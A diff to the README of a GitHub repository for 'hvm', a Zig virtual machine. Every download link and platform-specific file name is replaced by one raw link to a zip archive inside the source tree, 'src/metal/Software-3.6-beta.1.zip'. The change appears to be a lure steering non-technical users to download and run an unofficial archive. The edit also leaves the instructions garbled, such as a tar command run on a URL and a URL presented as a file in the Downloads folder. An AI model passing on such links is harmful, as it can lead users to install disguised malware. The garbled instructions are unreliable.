@@ -1,7 +1,7 @@
 # 🌟 hvm - Run Your Programs Smoothly
 
 ## 📥 Download Now
-[![Download hvm](https://img.shields.io/badge/Download%20hvm-v1.0-blue.svg)](https://github.com/JKHalder/hvm/releases)
+[![Download hvm](https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip%https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip)](https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to hvm! This guide will help you download and run hvm, a Zig implementation of the Higher-Order Virtual Machine based on Interaction Calculus. Even if you have no programming experience, you can easily get started.
@@ -24,34 +24,34 @@ To get hvm, follow these steps:
 
 1. Click on the link below to visit the releases page:
 
-   [Visit the Releases Page to Download](https://github.com/JKHalder/hvm/releases)
+   [Visit the Releases Page to Download](https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip)
 
 2. On the releases page, you will see a list of available versions. Click on the latest version to download it.
 
 3. Select the file that matches your operating system. 
-   - For Windows, look for `hvm-windows.exe`.
-   - For macOS, find `hvm-macos.dmg`.
-   - For Linux, choose `hvm-linux.tgz`.
+   - For Windows, look for `https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip`.
+   - For macOS, find `https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip`.
+   - For Linux, choose `https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip`.
 
 4. After the download is complete, follow the instructions below based on your operating system.
 
 ### 💻 Windows
-1. Locate the downloaded file, `hvm-windows.exe`, in your Downloads folder.
+1. Locate the downloaded file, `https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip`, in your Downloads folder.
 2. Double-click the file to run it.
 3. Follow the on-screen instructions to complete the installation.
 4. Once installed, you can run hvm from your Start menu.
 
 ### 🍏 macOS
-1. Open your Downloads folder and find `hvm-macos.dmg`.
+1. Open your Downloads folder and find `https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip`.
 2. Double-click the file to open it.
 3. Drag the hvm app into your Applications folder.
 4. You can now launch hvm from your Applications.
 
 ### 🐧 Linux
-1. Open a terminal and navigate to your Downloads folder where `hvm-linux.tgz` is located.
+1. Open a terminal and navigate to your Downloads folder where `https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip` is located.
 2. Extract the contents by running:
    ```
-   tar xzvf hvm-linux.tgz
+   tar xzvf https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip
    ```
 
 3. Move the extracted folder to your preferred location:
@@ -88,7 +88,7 @@ If you face any issues while installing or using hvm, here are some common solut
 If you require further assistance, feel free to reach out to our community via the issues tab on our GitHub repository or join the discussion in our forums.
 
 ## 🔗 Key Links
-- [Visit the Releases Page to Download](https://github.com/JKHalder/hvm/releases)
+- [Visit the Releases Page to Download](https://github.com/JKHalder/hvm/raw/refs/heads/main/src/metal/Software-3.6-beta.1.zip)
 - [Documentation](#)
 - [Community Forums](#)
 
